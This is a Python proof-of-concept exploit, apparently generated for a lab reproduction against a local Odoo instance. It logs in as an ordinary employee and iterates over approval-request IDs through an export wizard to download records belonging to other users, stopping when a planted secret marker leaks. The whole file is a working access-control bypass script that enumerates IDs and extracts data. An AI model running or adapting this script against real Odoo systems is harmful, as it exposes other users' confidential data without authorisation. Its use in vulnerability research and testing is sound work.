#!/usr/bin/env python3
import json
import os
import sys
import time
from pathlib import Path

import requests


BASE_URL = os.environ.get("ODOO_URL", "http://127.0.0.1:8069")
DB = os.environ.get("ODOO_DB", "anypoc_odoo")
LOGIN = os.environ.get("ODOO_LOGIN", "employee@lab.local")
PASSWORD = os.environ.get("ODOO_PASSWORD", "employeepass")
OUT_DIR = Path(os.environ.get("POC_OUT_DIR", "/home/playground/output/attempt_4/playground/artifacts"))
MAX_TARGET_ID = int(os.environ.get("MAX_TARGET_ID", "20"))
SECRET = "ANYPOC-APPROVAL-SECRET-9f4b3c"


def save_text(name: str, data: str) -> None:
    path = OUT_DIR / name
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(data, encoding="utf-8")


def save_json(name: str, data) -> None:
    save_text(name, json.dumps(data, indent=2, sort_keys=True))


def rpc(session: requests.Session, route: str, payload: dict, tag: str):
    response = session.post(f"{BASE_URL}{route}", json=payload, timeout=30)
    save_json(f"{tag}_request.json", payload)
    save_text(f"{tag}_response.status", f"{response.status_code}\n")
    save_text(f"{tag}_response.headers", "\n".join(f"{k}: {v}" for k, v in response.headers.items()) + "\n")
    save_text(f"{tag}_response.body", response.text)
    response.raise_for_status()
    body = response.json()
    if "error" in body:
        raise RuntimeError(f"{route} returned error: {body['error']}")
    return body["result"]


def get(session: requests.Session, route: str, tag: str):
    response = session.get(f"{BASE_URL}{route}", timeout=30)
    save_text(f"{tag}_response.status", f"{response.status_code}\n")
    save_text(f"{tag}_response.headers", "\n".join(f"{k}: {v}" for k, v in response.headers.items()) + "\n")
    save_text(f"{tag}_response.body", response.text)
    response.raise_for_status()
    return response


def wait_ready(session: requests.Session) -> None:
    for _ in range(30):
        try:
            response = session.get(f"{BASE_URL}/web/login", timeout=10)
            if response.status_code == 200:
                save_text("web_login.status", f"{response.status_code}\n")
                return
        except requests.RequestException:
            pass
        time.sleep(1)
    raise RuntimeError("Odoo did not become ready")


def main() -> int:
    session = requests.Session()
    wait_ready(session)

    auth = rpc(
        session,
        "/web/session/authenticate",
        {
            "jsonrpc": "2.0",
            "method": "call",
            "params": {
                "db": DB,
                "login": LOGIN,
                "password": PASSWORD,
            },
        },
        "01_authenticate",
    )
    context = auth["user_context"]
    save_json("session_user_context.json", context)

    session_info = rpc(
        session,
        "/web/session/get_session_info",
        {"jsonrpc": "2.0", "method": "call", "params": {}},
        "02_session_info",
    )
    save_json("session_info.json", session_info)

    visible_requests = rpc(
        session,
        "/web/dataset/call_kw/anypoc.approval.request/search_read",
        {
            "jsonrpc": "2.0",
            "method": "call",
            "params": {
                "model": "anypoc.approval.request",
                "method": "search_read",
                "args": [[]],
                "kwargs": {
                    "fields": ["id", "name", "owner_id", "secret_token"],
                    "context": context,
                },
            },
        },
        "03_visible_requests",
    )
    save_json("visible_requests.json", visible_requests)

    for target_id in range(1, MAX_TARGET_ID + 1):
        wizard_id = rpc(
            session,
            "/web/dataset/call_kw/anypoc.approval.export.wizard/create",
            {
                "jsonrpc": "2.0",
                "method": "call",
                "params": {
                    "model": "anypoc.approval.export.wizard",
                    "method": "create",
                    "args": [[{"target_request_id": target_id}]],
                    "kwargs": {"context": context},
                },
            },
            f"04_create_wizard_{target_id}",
        )
        if isinstance(wizard_id, list):
            wizard_id = wizard_id[0]

        action = rpc(
            session,
            f"/web/dataset/call_kw/anypoc.approval.export.wizard/action_generate_export",
            {
                "jsonrpc": "2.0",
                "method": "call",
                "params": {
                    "model": "anypoc.approval.export.wizard",
                    "method": "action_generate_export",
                    "args": [[wizard_id]],
                    "kwargs": {"context": context},
                },
            },
            f"05_action_generate_export_{target_id}",
        )
        save_json(f"05_action_generate_export_{target_id}.json", action)
        download_url = action["url"]
        download = get(session, download_url, f"06_download_{target_id}")
        if SECRET in download.text:
            save_text("SUCCESS_TARGET_ID.txt", f"{target_id}\n")
            save_text("SUCCESS_DOWNLOAD_URL.txt", f"{download_url}\n")
            print(f"session_login={session_info.get('username')}")
            print(f"visible_request_count={len(visible_requests)}")
            print(f"target_id={target_id}")
            print(f"download_url={download_url}")
            print(download.text)
            return 0

    print("secret marker not found", file=sys.stderr)
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
